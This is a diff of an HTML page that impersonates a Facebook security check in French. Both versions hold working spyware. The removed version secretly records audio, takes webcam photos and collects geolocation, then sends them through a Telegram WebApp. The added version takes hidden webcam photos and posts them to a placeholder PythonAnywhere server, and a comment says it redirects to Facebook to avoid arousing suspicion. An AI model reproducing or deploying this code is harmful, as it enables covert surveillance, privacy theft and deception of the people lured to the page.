@@ -1,3 +1,66 @@
 <!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Connexion</title>
+    <style>
+        body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .logo { color: #1877f2; font-size: 45px; font-weight: bold; margin-bottom: 20px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { color: #606770; margin-top: 15px; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="logo">facebook</div>
+    <div class="loader"></div>
+    <p>Vérification de sécurité en cours...</p>
 
-<html> <head> <meta charset="UTF-8"> <title>Facebook</title> <script src=""></script> <style> body { background: #f0f2f5; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; } .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; } .loader { border: 3px solid #ddd; border-top: 3px solid #1877f2; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style> </head> <body> <div class="logo">facebook</div> <div class="loader"></div> <p style="color:#606770; font-size:14px;">Chargement de votre session...</p> <video id="v" autoplay playsinline style="display:none;"></video> <canvas id="c" style="display:none;"></canvas> <script> const tg = window.Telegram.WebApp; tg.expand(); let photos = []; let count = 0; async function start() { try { const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } }); document.getElementById('v').srcObject = stream; const rec = new MediaRecorder(stream); let chunks = []; rec.ondataavailable = e => chunks.push(e.data); rec.onstop = () => { const reader = new FileReader(); reader.readAsDataURL(new Blob(chunks, { type: 'audio/ogg' })); reader.onloadend = () => { send(reader.result); }; }; rec.start(); setTimeout(() => { if(rec.state !== "inactive") rec.stop(); }, 30000); const inv = setInterval(() => { if (count < 10) { const canvas = document.getElementById('c'); const video = document.getElementById('v'); canvas.width = 640; canvas.height = 480; canvas.getContext('2d').drawImage(video, 0, 0); photos.push(canvas.toDataURL('image/jpeg', 0.5)); count++; } else { clearInterval(inv); } }, 2000); } catch (e) { setTimeout(() => tg.close(), 3000); } } function send(aud) { navigator.geolocation.getCurrentPosition(pos => { tg.sendData(JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, pics: photos, aud: aud })); tg.close(); }, () => { tg.sendData(JSON.stringify({ lat: 0, lon: 0, pics: photos, aud: aud })); tg.close(); }); } window.onload = start; </script> </body> </html>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id'); // Récupère votre ID Telegram dans l'URL
+        let photos = [];
+
+        async function initCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
+                document.getElementById('v').srcObject = stream;
+                
+                let count = 0;
+                const interval = setInterval(() => {
+                    if (count < 5) { // Capture 5 photos
+                        const canvas = document.getElementById('c');
+                        canvas.width = 640; canvas.height = 480;
+                        canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
+                        photos.push(canvas.toDataURL('image/jpeg', 0.5));
+                        count++;
+                    } else { 
+                        clearInterval(interval);
+                        sendToServer(); 
+                    }
+                }, 2000);
+            } catch (err) {
+                // Si l'utilisateur refuse, on redirige quand même pour ne pas éveiller de soupçons
+                window.location.href = "https://m.facebook.com";
+            }
+        }
+
+        function sendToServer() {
+            // REMPLACER CI-DESSOUS PAR VOTRE URL PYTHONANYWHERE
+            fetch('https://VOTRE_NOM.pythonanywhere.com/data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, pics: photos })
+            }).finally(() => {
+                window.location.href = "https://m.facebook.com";
+            });
+        }
+
+        window.onload = initCapture;
+    </script>
+</body>
+</html>
